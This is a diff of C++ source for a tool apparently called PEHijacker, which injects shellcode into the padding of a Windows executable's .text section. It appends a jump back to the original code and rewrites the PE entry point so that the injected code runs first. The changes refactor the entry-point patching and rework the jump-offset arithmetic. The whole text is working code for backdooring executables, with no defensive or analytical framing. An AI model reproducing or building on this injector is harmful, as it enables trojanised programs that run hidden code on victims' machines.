@@ -45,21 +45,26 @@ void PEHijacker::hijack() {
 		this->peBuffer[startOfPadding + i] = this->shellcode[i];
 
 	DWORD newEntryAddress = textSection->VirtualAddress + textSection->Misc.VirtualSize;
-	DWORD entryAddressFileOffset = this->peDosHeader->e_lfanew + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER) + offsetof(_IMAGE_OPTIONAL_HEADER, AddressOfEntryPoint);
-	int jumpDistance = newEntryAddress - this->getEntryAddress() + this->shellcodeLength;
-	printf("jumpDistance: %d bytes (0x%08x)\n", jumpDistance, jumpDistance);
-
-	this->peBuffer[startOfPadding + this->shellcodeLength - 1] = 0x9E;
+	
+	int jumpDistance = newEntryAddress - this->getEntryAddress() + this->shellcodeLength + 4;
+	jumpDistance = -jumpDistance;
+	
+	this->peBuffer[startOfPadding + this->shellcodeLength - 1] = this->INST_X86_JMP_NEAR_REL;
 	for (int i = 0; i < sizeof(jumpDistance); i++)
 		this->peBuffer[startOfPadding + this->shellcodeLength + i] = *((unsigned char *)&jumpDistance + i);
 
-	for (int i = 0; i < sizeof(newEntryAddress); i++)
-		this->peBuffer[entryAddressFileOffset + i] = *((unsigned char *)&newEntryAddress + i);
+	this->setEntryAddress(newEntryAddress);
 }
 
 // ============================================================================= //
 //  Helper Functions
 // ============================================================================= //
+
+void PEHijacker::setEntryAddress(DWORD address) {
+	DWORD entryAddressFileOffset = this->peDosHeader->e_lfanew + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER) + offsetof(_IMAGE_OPTIONAL_HEADER, AddressOfEntryPoint);
+	for (int i = 0; i < sizeof(address); i++)
+		this->peBuffer[entryAddressFileOffset + i] = *((unsigned char *)&address + i);
+}
 
 PIMAGE_SECTION_HEADER PEHijacker::getSectionHeader(char * sectionName) {
 	for (int i = 0; i < this->peFileHeader->NumberOfSections; i++)
@@ -84,21 +89,9 @@ DWORD PEHijacker::getPaddingSize(PIMAGE_SECTION_HEADER sectionHeader) {
 	return (sectionHeader->SizeOfRawData - sectionHeader->Misc.VirtualSize);
 }
 
-// ============================================================================= //
-//  Setters
-// ============================================================================= //
-
-void PEHijacker::setArchitecture(int arch)
-{
-}
-
-void PEHijacker::setShellcode(unsigned char * shellcode, unsigned int length) {
+void PEHijacker::setShellcode(unsigned char * shellcode, int length) {
 	this->shellcode = shellcode;
 	this->shellcodeLength = length;
-}
-
-void PEHijacker::setEntryPoint(DWORD address)
-{
 }
 
 // ============================================================================= //
@@ -137,3 +130,5 @@ void PEHijacker::printSectionHeader(PIMAGE_SECTION_HEADER sectionHeader) {
 	printf("  Padding Size: %d bytes (0x%08x)\n", paddingSize, paddingSize);
 	printf("\n");
 }
+
+// printf("%d (0x%08x) - %d (0x%08x) + %d (0x%08x) = %d (0x%08x)\n", newEntryAddress, newEntryAddress, this->getEntryAddress(), this->getEntryAddress(), this->shellcodeLength, this->shellcodeLength, jumpDistance, jumpDistance);
